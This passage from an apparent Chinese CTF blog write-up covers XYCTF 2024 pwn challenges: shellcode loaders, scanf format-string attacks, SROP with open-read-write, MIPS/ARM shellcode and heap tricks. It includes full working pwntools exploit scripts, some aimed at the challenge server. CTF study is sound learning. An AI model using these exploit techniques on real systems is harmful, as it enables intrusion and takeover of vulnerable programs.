class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;show your magic: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">      *((_DWORD *)v5 + <span class="number">4</span> * i) = buf[i];</span><br><span class="line">    v5();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellcode题，但是题目只能把我们写的12个字节shellcode写进0x114514000中，并且每四个字节之间会有很多\x00的空挡。直接写sh肯定不行，所以我们写一个shellcode loader，也就是先构造一个read函数，然后再读取sh的shellcode。</p><h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>查询之后发现<code> 00 00   add    BYTE PTR [rax],  al</code>，如果要绕过那些空档，那么需要确保rax里存的是一个合法的地址。但是会占用很多字节，地址可能在四个字节写不下。我们先来看一下当时寄存器的状况。（不要在意将要执行的指令，我是用exp来调试的）</p><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/intermittent_%E5%AF%84%E5%AD%98%E5%99%A8%E7%8A%B6%E6%80%81.png" alt="intermittent_寄存器状态"></p><p>rdx放了mmap的地址，rdi是0，那只要把rdx中的内容放到rsi中后，syscall就能执行read了。<code>push rdx; pop rsi</code>总共四个字节刚好。因为rip是从mmap地址+4开始的，所以后面写入sh的shellcode之前要填充4个junkdata。</p><h5 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;localhost&#x27;, 63069)</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sc))</span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b *$rebase(0x1353)&quot;)</span></span><br><span class="line">pause()</span><br><span class="line">r.sendline(sc)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x07-fmt"><a href="#0x07-fmt" class="headerlink" title="0x07 fmt"></a>0x07 fmt</h3><h5 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to xyctf, this is a gift: %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf1, <span class="number">0x20</span>uLL);</span><br><span class="line">  __isoc99_scanf(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;show your magic&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题的fmt不同往常针对printf函数族，而是针对scanf的。第一次接触，上网查了半天，唯一一篇讲scanf格式化字符串漏洞的文章还要钱，所以就自己去尝试调试了。然后发现像%n，%p这样的格式化字符串也能用在scanf里面，偏移也能用。调试发现到ret地址的偏移是13，本来想直接%13$s劫持程序控制流，发现不行，调试发现卡在了类似[reg]这样的指令上，尝试其他的格式化字符串也是一样的结果。</p><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/fmt_%E5%8D%A1%E4%BD%8F%E6%8C%87%E4%BB%A4.png" alt="fmt_卡住指令"></p><p>因为scanf第二个参数被解析的时候会被当作指针处理，如果不指向一个合法地址就会报错。此时rdx指向的是一条指令而非地址，所以不可行。除非在栈上能找到一个指针指向ret地址的栈，但很可惜找不到。想到可以模仿printf那样任意地址写，我们只需要把某个地址写到栈上再通过偏移来修改即可。程序泄露了libc地址，但是没有泄露栈地址，给了libc附件是2.31版本的，所以考虑改exit_hook为后门地址。</p><h5 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;172.21.78.37&#x27;</span>, <span class="number">50530</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: 0x&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(r.recv(<span class="number">12</span>)[-<span class="number">12</span>:].rjust(<span class="number">16</span>, <span class="string">b&#x27;0&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gift))</span><br><span class="line">hook = gift+<span class="number">0x1c12a8</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;%8$s\x00\x00\x00\x00&#x27;</span>+p64(hook)*<span class="number">3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x40128D&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.sendline(p64(<span class="number">0x4012BE</span>))<span class="comment"># backdoor</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x08-simple-srop"><a href="#0x08-simple-srop" class="headerlink" title="0x08 simple_srop"></a>0x08 simple_srop</h3><h5 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h5><p>程序很简单，就一个read溢出，没有其他东西了。但是在函数列表中可以看到sandbox和rt_sigreturn两个函数。我们先扔到seccomp-tools看下开了什么沙盒。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  <span class="type">CODE</span>  <span class="type">JT</span>   <span class="type">JF</span>      <span class="type">K</span></span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="type">A</span> = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (<span class="type">A</span> != <span class="type">ARCH_X86_64</span>) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="type">A</span> = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (<span class="type">A</span> &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (<span class="type">A</span> != <span class="number">0xffffffff</span>) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (<span class="type">A</span> == execve) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (<span class="type">A</span> == execveat) goto <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  return <span class="type">ALLOW</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  return <span class="type">KILL</span></span><br></pre></td></tr></table></figure><p>禁用了execve，那我们就用srop+orw的方式获取flag。srop在我理解中其实就是可以控制全部寄存器的一种手段。我们利用pwntools自带的srop框架功能来编写exp就行。在orw之前我们还需要解决一个问题，就是要把flag这个字符串写到程序当中，因为open需要用到flag字符串的地址。我们考虑把flag写到bss段。flag读取出来后也是存在bss段。</p><p>在写exp的时候我遇到了一个问题，我把rbp和rsp写成bss+offset的形式打不通，而写了超出程序使用的虚拟内存地址就可以了。另外就是打远程的时候时好时坏也不知道是exp的问题还是靶机的问题。</p><h5 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;172.21.78.37&#x27;</span>, <span class="number">49320</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x40129D</span></span><br><span class="line">sigretrun = <span class="number">0x401296</span></span><br><span class="line">main = <span class="number">0x4012A3</span></span><br><span class="line">bss = e.bss()+<span class="number">0x100</span></span><br><span class="line">flag_str = bss</span><br><span class="line">store_flag = bss+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = bss</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rbp = <span class="number">0x404168</span></span><br><span class="line">frame.rsp = <span class="number">0x404168</span></span><br><span class="line"></span><br><span class="line">flag_pay = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>.ljust(</span><br><span class="line">    <span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)+p64(sigretrun)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">r.sendline(flag_pay)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 2,open(flag,0,0) to get flag</span></span><br><span class="line"><span class="comment"># 0 represents READONLY</span></span><br><span class="line">openflag = SigreturnFrame()</span><br><span class="line">openflag.rax = <span class="number">0x2</span></span><br><span class="line">openflag.rdi = flag_str</span><br><span class="line">openflag.rsi = <span class="number">0x0</span></span><br><span class="line">openflag.rcx = <span class="number">0x0</span></span><br><span class="line">openflag.rdx = <span class="number">0x0</span></span><br><span class="line">openflag.rip = syscall</span><br><span class="line">openflag.rbp = <span class="number">0x404268</span></span><br><span class="line">openflag.rsp = <span class="number">0x404268</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0,read(3,bss,100)from (open) to (bss)</span></span><br><span class="line">readflag = SigreturnFrame()</span><br><span class="line">readflag.rax = <span class="number">0x0</span></span><br><span class="line">readflag.rdi = <span class="number">3</span></span><br><span class="line">readflag.rsi = store_flag</span><br><span class="line">readflag.rdx = <span class="number">0x100</span></span><br><span class="line">readflag.rip = syscall</span><br><span class="line">readflag.rbp = <span class="number">0x404368</span></span><br><span class="line">readflag.rsp = <span class="number">0x404368</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 1,write(1,bss,100) from (bss) to me</span></span><br><span class="line">writeflag = SigreturnFrame()</span><br><span class="line">writeflag.rax = <span class="number">0x1</span></span><br><span class="line">writeflag.rdi = <span class="number">0x1</span></span><br><span class="line">writeflag.rsi = store_flag</span><br><span class="line">writeflag.rdx = <span class="number">0x100</span></span><br><span class="line">writeflag.rip = syscall</span><br><span class="line">writeflag.rbp = <span class="number">0xdeadbeef</span></span><br><span class="line">writeflag.rsp = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload += p64(sigretrun)</span><br><span class="line">payload += <span class="built_in">bytes</span>(openflag)</span><br><span class="line"></span><br><span class="line">payload += p64(sigretrun)</span><br><span class="line">payload += <span class="built_in">bytes</span>(readflag)</span><br><span class="line"></span><br><span class="line">payload += p64(sigretrun)</span><br><span class="line">payload += <span class="built_in">bytes</span>(writeflag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x09-EZ1-0"><a href="#0x09-EZ1-0" class="headerlink" title="0x09 EZ1.0"></a>0x09 EZ1.0</h3><h5 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h5><p>mips架构异构pwn，上题的前一天晚上刚接触异构pwn的简单rop，这就来了个shellcode题。程序很简单，除了个read溢出之外什么都没有了，静态编译。检查保护发现NX没开，mips好像也不支持NX，所以可以写shellcode到栈上。但是又没泄露栈地址，泄露起来比较麻烦，主要是找gadget很麻烦，所以考虑写到bss段上然后栈迁移到bss上执行。mips中的fp寄存器相当于ebp，ra相当于eip。</p><h5 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process([<span class="string">&#x27;qemu-mipsel-static&#x27;</span>,  <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>, <span class="string">&#x27;./mips&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&#x27;172.21.78.37&#x27;, 54539)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    lui $t6,0x2f62</span></span><br><span class="line"><span class="string">    ori $t6,$t6,0x696e</span></span><br><span class="line"><span class="string">    sw $t6,28($sp)     </span></span><br><span class="line"><span class="string">    lui $t7,0x2f2f</span></span><br><span class="line"><span class="string">    ori $t7,$t7,0x7368</span></span><br><span class="line"><span class="string">    sw $t7,32($sp)                    </span></span><br><span class="line"><span class="string">    sw $zero,36($sp)                 </span></span><br><span class="line"><span class="string">    la $a0,28($sp)                     </span></span><br><span class="line"><span class="string">    addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">    addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">    addiu $v0,$zero,4011     </span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">         &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x41DC0C</span></span><br><span class="line">read_addr = <span class="number">0x400860</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p32(e.bss()+<span class="number">0x200</span>-<span class="number">0x60</span>+<span class="number">68</span>)+p32(read_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">68</span>+p32(e.bss()+<span class="number">0x200</span>+<span class="number">68</span>)+asm(shellcraft.sh())</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0X0A-EZ2-0"><a href="#0X0A-EZ2-0" class="headerlink" title="0X0A EZ2.0"></a>0X0A EZ2.0</h3><h5 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h5><p>arm架构异构pwn，也是shellcode题，和mips不同的是，这个程序开启了NX，所以想要执行shellcode还得先用mprotect在bss段开辟一段可执行的内存空间才行，然后把栈迁移到bss去执行shellcode。</p><h5 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process([&#x27;qemu-arm-static&#x27;, &#x27;./arm&#x27;])</span></span><br><span class="line">r = remote(<span class="string">&#x27;172.21.78.37&#x27;</span>, <span class="number">58744</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    add r0, pc, #12</span></span><br><span class="line"><span class="string">    mov r1, #0</span></span><br><span class="line"><span class="string">    mov r2, #0</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_r0_4_lr = <span class="number">0x521BC</span></span><br><span class="line">pop_r7_pc = <span class="number">0x00027d78</span></span><br><span class="line">pop_r0_pc = <span class="number">0x5f73c</span></span><br><span class="line">mprotect_addr = <span class="number">0x28F10</span></span><br><span class="line">read_addr = <span class="number">0x10588</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(e.bss()+<span class="number">0x44</span>)+p32(pop_r0_pc)+p32(mprotect_addr)+p32(pop_r0_4_lr)+p32(e.bss()) + \</span><br><span class="line">    p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(read_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = sc.ljust(<span class="number">0x44</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(e.bss())</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x0B-malloc-flag"><a href="#0x0B-malloc-flag" class="headerlink" title="0x0B malloc_flag"></a>0x0B malloc_flag</h3><h5 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h5><p>堆题，但是静态反编译之后看起来很复杂，其实就是输出了一堆中文而已。另外有一些之前没接触过的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">  fseek(stream, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">  n = ftell(stream);</span><br><span class="line">  rewind(stream);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = fread((<span class="type">char</span> *)ptr + <span class="number">16</span>, <span class="number">1uLL</span>, n, stream);</span><br><span class="line">    <span class="keyword">if</span> ( v11 == n )</span><br><span class="line">    &#123;</span><br><span class="line">      fclose(stream);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fseek</code>函数用于重定位流上的文件指针<br><code>ftell</code>函数用于返回当前文件的指针<br><code>rewind</code>函数用于将文件指针移动到文件起始位置</p><p>所以程序开头的代码简单来讲就是打开flag文件后，计算flag内容长度，然后读到了一个大小为0x100的堆内存上，并释放掉。题目给了libc附件，显示是2.31版本，所以这个chunk被释放之后会被放到tcachebin中。所以我们只要再申请一个0x100的chunk就能得到包含flag的chunk。</p><h5 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;0x100&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x0C-fastfastfast"><a href="#0x0C-fastfastfast" class="headerlink" title="0x0C fastfastfast"></a>0x0C fastfastfast</h3><h5 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h5><p>题目提示了要用fastbin attack。题目提供了create、delete和show三种函数功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span 